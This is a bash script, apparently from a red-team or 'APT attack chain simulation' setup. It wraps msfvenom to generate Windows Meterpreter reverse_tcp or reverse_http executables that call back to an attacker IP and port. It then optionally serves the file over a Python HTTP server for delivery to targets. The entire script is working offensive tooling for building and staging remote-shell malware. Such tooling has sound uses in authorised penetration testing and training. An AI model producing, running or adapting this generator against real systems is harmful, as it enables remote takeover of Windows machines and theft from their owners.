#!/bin/bash
# generate-payload.sh – APT Attack Chain Simulation
# Generate malicious payloads for Windows targets (reverse TCP / reverse HTTP)

set -e

# Default values
LHOST="192.168.1.5"
LPORT="4444"
PAYLOAD_TYPE="reverse_tcp"
ARCH="x64"
OUTPUT_DIR="/tmp"
OUTPUT_FILE="shell.exe"

usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Generate Windows Meterpreter payloads using msfvenom.

OPTIONS:
    -h, --help              Show this help message
    -i, --ip LHOST          Attacker IP address (default: 192.168.1.5)
    -p, --port LPORT        Attacker port (default: 4444 for reverse_tcp, 8081 for reverse_http)
    -t, --type TYPE         Payload type: reverse_tcp or reverse_http (default: reverse_tcp)
    -a, --arch ARCH         Architecture: x86 or x64 (default: x64)
    -o, --output FILE       Output file name (default: shell.exe)
    -d, --output-dir DIR    Output directory (default: /tmp)

EXAMPLES:
    ./generate-payload.sh -i 192.168.1.5 -p 4444 -t reverse_tcp -a x64
    ./generate-payload.sh --ip 192.168.1.5 --port 8081 --type reverse_http --output beacon.exe
EOF
    exit 0
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help) usage ;;
        -i|--ip) LHOST="$2"; shift 2 ;;
        -p|--port) LPORT="$2"; shift 2 ;;
        -t|--type) PAYLOAD_TYPE="$2"; shift 2 ;;
        -a|--arch) ARCH="$2"; shift 2 ;;
        -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
        -d|--output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        *) echo "Unknown option: $1"; usage ;;
    esac
done

# Validate payload type
if [[ "$PAYLOAD_TYPE" != "reverse_tcp" && "$PAYLOAD_TYPE" != "reverse_http" ]]; then
    echo "Error: Payload type must be 'reverse_tcp' or 'reverse_http'"
    exit 1
fi

# Validate architecture
if [[ "$ARCH" != "x86" && "$ARCH" != "x64" ]]; then
    echo "Error: Architecture must be 'x86' or 'x64'"
    exit 1
fi

# Set msfvenom payload name
if [[ "$PAYLOAD_TYPE" == "reverse_tcp" ]]; then
    if [[ "$ARCH" == "x64" ]]; then
        MSF_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
    else
        MSF_PAYLOAD="windows/meterpreter/reverse_tcp"
    fi
else # reverse_http
    if [[ "$ARCH" == "x64" ]]; then
        MSF_PAYLOAD="windows/x64/meterpreter/reverse_http"
    else
        MSF_PAYLOAD="windows/meterpreter/reverse_http"
    fi
fi

OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_FILE}"

echo "[+] Generating payload: $MSF_PAYLOAD"
echo "    LHOST: $LHOST, LPORT: $LPORT"
echo "    Architecture: $ARCH"
echo "    Output: $OUTPUT_PATH"

# Generate payload
msfvenom -p "$MSF_PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTPUT_PATH"

if [[ $? -eq 0 ]]; then
    echo "[+] Payload saved to $OUTPUT_PATH"
    echo "[+] File size: $(du -h "$OUTPUT_PATH" | cut -f1)"
    echo "[+] MD5: $(md5sum "$OUTPUT_PATH" | cut -d' ' -f1)"
else
    echo "[-] Payload generation failed"
    exit 1
fi

# Optional: start HTTP server for transfer (if requested)
read -p "Start HTTP server on port 8080 for transfer? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    cd "$OUTPUT_DIR"
    echo "[+] Starting HTTP server on port 8080. Press Ctrl+C to stop."
    python3 -m http.server 8080
fi

exit 0